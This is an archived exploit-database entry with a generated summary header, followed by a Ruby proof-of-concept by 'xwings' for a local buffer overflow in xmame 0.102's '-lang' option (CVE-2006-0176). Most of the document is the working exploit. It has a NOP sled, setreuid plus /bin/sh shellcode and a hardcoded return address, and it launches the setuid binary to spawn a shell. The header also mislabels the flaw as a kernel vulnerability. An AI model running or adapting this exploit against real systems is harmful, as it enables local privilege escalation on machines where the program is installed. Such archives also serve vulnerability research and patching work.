# #<-- Publish Date -->#
# 2006-01-10

# #<-- Technical Document Summary (TDS) -->#
# The exploit uses a local buffer overflow vulnerability in xmame's "-lang" option to execute shellcode. The vulnerability stems from improper input validation of user-supplied command-line arguments, allowing an attacker to write arbitrary data beyond the intended buffer size. This enables the injection of malicious code into memory, which is then executed by the system. The affected component is the xmame multimedia player, specifically its configuration handling of the "-lang" option.

# #<-- Layman's Document Summary (LDS) -->#
# The weakness allows an attacker to execute arbitrary code on the system by sending a crafted command-line argument to the xmame application. This occurs because the program fails to properly sanitize input when constructing a buffer for execution, leading to a memory corruption that can be exploited to run shellcode.

# #<-- Key Words (KW) -->#
# exploit,local buffer overflow,xmame,lang option,shellcode execution,Linux,kernel vulnerability,OSVDB-22481

# #<-- Related Terms -->#
# buffer overflow,exploit,local code execution,software vulnerability,operating system,exploit-db,osvdb

# #<-- Entities/Attributes -->#
# Software: xmame
# Version: 0.102
# File path: /usr/games/xmame.x11
# Argument: -lang
# Vulnerability ID: CVE-2006-0176
# Platform: Linux
# Architecture: i686
# Programming language: Ruby

# #<-- Vulnerability Type -->#
# Not specified in source

# #<-- Original Content -->#

#!/usr/bin/ruby

#
# One of the PoC code for xmame "-lang" options.
# Advisory is base on : http://kerneltrap.org/node/6055
#
# by xwings at mysec dot org
# url : http://www.mysec.org , new website

# Tested on :
# Linux debian24 2.4.27-2-386 #1 Mon May 16 16:47:51 JST 2005 i686 GNU/Linux
# gcc version 4.0.3 20060104 (prerelease) (Ubuntu 4.0.2-6ubuntu1)
# xmame 0.102 , ./configure && make && make install
#


#setreuid(geteuid(),geteuid()) execl(); executes /bin//sh 49 bytes.
shellcode =     "\x31\xc9\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0"+
                "\x46\xcd\x80\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"+
                "\x6e\x89\xe3\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\xb0\x01"+
                "\x31\xdb\xcd\x80"

vulnpath        = "/usr/games/xmame.x11"
argvopt         = "-lang"

ret = (0xbfffe8da)
retadd  = ([ret].pack('V'))

nops    = ("\x90" * (1056 - (shellcode.length + retadd.length)))
buffer  = nops+shellcode+retadd

system(vulnpath,argvopt,buffer)

# milw0rm.com [2006-01-10]